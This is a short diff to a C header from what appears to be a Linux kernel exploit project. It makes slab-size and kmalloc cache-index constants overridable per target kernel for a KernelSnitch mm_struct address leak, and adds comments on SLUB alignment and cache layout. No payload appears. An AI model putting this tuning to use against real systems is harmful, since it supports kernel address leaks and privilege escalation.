@@ -48,7 +48,17 @@
 #define __ASHMEMIOC 0x77
 #define ASHMEM_SET_NAME _IOW(__ASHMEMIOC, 1, char[ASHMEM_NAME_LEN])
 
+// KernelSnitch walks the mm_struct slab in MM_STRUCT_SZ strides looking for a
+// futex-hash collision, so this has to be the real SLUB object size for the
+// target kernel — sizeof(struct mm_struct) rounded up to the cache line, since
+// mm_cachep is created with SLAB_HWCACHE_ALIGN. Get it wrong and the scan
+// simply never lands on a live object: the search itself is pure userspace
+// arithmetic, so it does not crash, it just reports "mm_struct leak failed"
+// forever. mm_struct is one of the fastest-churning structs in the kernel, so
+// a target on a different kernel line overrides this in its target.h.
+#ifndef MM_STRUCT_SZ
 #define MM_STRUCT_SZ 0x500
+#endif
 #define MM_ORDER 3
 #define MM_PARTIALS 5
 #define CORE 0
@@ -81,9 +91,21 @@
 #define KMALLOC_SHIFT_HIGH (PAGE_SHIFT + 1)
 #define KMALLOC_BUCKETS (KMALLOC_SHIFT_HIGH + 1)
 #define KMALLOC_NORMAL_TYPE 0
+// Row index into kmalloc_caches[NR_KMALLOC_TYPES][KMALLOC_BUCKETS], and the
+// number of rows. Both come from enum kmalloc_cache_type, whose members are
+// conditionally compiled out: KMALLOC_DMA collapses onto KMALLOC_NORMAL when
+// CONFIG_ZONE_DMA is off, and the member order differs between kernel lines.
+// These are therefore per-kernel values, not constants, and a target on a
+// different line overrides them in its target.h. Picking the wrong row
+// silently selects a different cache (RECLAIM instead of CGROUP, say), and an
+// oversized row count reads past the end of the array.
+#ifndef KMALLOC_CGROUP_TYPE
 #define KMALLOC_CGROUP_TYPE 2
+#endif
 #define KMALLOC_PIPE_INDEX 11
+#ifndef KMALLOC_CACHE_TYPES
 #define KMALLOC_CACHE_TYPES 4
+#endif
 #define KMALLOC_CACHE_SLOTS (KMALLOC_CACHE_TYPES * KMALLOC_BUCKETS)
 #define KMALLOC_CACHE_SLOT(type, index) \
   (KMALLOC_CACHES + ((type) * KMALLOC_BUCKETS + (index)) * 8)
